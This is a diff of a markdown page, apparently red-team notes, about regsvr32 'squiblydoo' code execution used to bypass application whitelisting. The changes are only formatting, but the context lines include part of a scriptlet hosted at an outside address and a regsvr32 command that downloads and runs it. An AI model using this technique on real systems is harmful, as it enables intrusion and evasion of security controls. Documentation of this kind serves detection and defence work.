@@ -6,8 +6,7 @@ description: regsvr32 (squiblydoo) code execution - bypass application whitelist
 
 ## Execution
 
-{% code-tabs %}
-{% code-tabs-item title="http://10.0.0.5/back.sct" %}
+{% code title="http://10.0.0.5/back.sct" %}
 ```markup
 <?XML version="1.0"?>
 <scriptlet>
@@ -22,18 +21,15 @@ description: regsvr32 (squiblydoo) code execution - bypass application whitelist
 </registration>
 </scriptlet>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 We need to host the back.sct on a web server so we can invoke it like so:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 ## Observations
 
